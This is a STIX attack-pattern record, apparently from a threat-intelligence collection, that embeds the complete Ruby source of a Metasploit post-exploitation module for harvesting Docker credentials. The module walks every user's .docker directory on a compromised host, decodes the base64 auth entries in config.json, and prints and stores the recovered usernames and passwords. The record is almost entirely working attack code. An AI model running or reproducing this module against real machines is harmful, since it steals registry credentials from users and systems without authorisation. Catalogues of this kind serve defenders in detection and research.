{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fa8657a8-c2e3-4c0f-afb3-9b72565498d9",
    "created": "2024-08-14T16:33:19.179563Z",
    "modified": "2024-08-14T16:33:19.179567Z",
    "name": "Multi Gather Docker Credentials Collection",
    "description": " This module will collect the contents of all users' .docker directories on the targeted machine. If the user has already push to docker hub, chances are that the password was saved in base64 (default behavior).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/docker_creds.rb",
            "external_id": "docker_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Docker Credentials Collection',\n        'Description' => %q{\n          This module will collect the contents of all users' .docker directories on the targeted\n          machine. If the user has already push to docker hub, chances are that the password was\n          saved in base64 (default behavior).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Flibustier'],\n        'Platform' => %w[bsd linux osx unix],\n        'SessionTypes' => ['shell']\n      )\n    )\n  end\n\n  # This module is largely based on gpg_creds.rb.\n\n  def run\n    print_status('Finding .docker directories')\n    paths = enum_user_directories.map { |d| d + '/.docker' }\n    # Array#select! is only in 1.9\n    paths = paths.select { |d| directory?(d) }\n\n    if paths.nil? || paths.empty?\n      print_error('No users found with a .docker directory')\n      return\n    end\n\n    download_loot(paths)\n  end\n\n  def download_loot(paths)\n    print_status(\"Looting #{paths.count} directories\")\n    paths.each do |path|\n      path.chomp!\n      file = 'config.json'\n      target = \"#{path}/#{file}\"\n\n      if file? target\n        print_status(\"Downloading #{target} -> #{file}\")\n        extract(target)\n      end\n    end\n  end\n\n  def extract(target)\n    file = read_file(target)\n    parsed = JSON.parse(file)\n    if parsed['auths']\n      parsed['auths'].each do |key, value|\n        vprint_status(\"key: #{key}\")\n        value.each do |k, v|\n          next unless k == 'auth'\n\n          plain = Rex::Text.decode_base64(v)\n          next unless plain.include? ':'\n\n          print_good(\"Found #{plain}\")\n          username, password = plain.split(':')\n          credential_data = {\n            origin_type: :import,\n            module_fullname: fullname,\n            filename: target,\n            workspace_id: myworkspace_id,\n            service_name: 'docker',\n            realm_value: key,\n            realm_key: Metasploit::Model::Realm::Key::WILDCARD,\n            private_type: :password,\n            private_data: password,\n            username: username\n          }\n          create_credential(credential_data)\n\n          print_good('Saved credentials')\n        end\n      end\n    else\n      print_status('No credentials found in config file')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix]"
    ]
}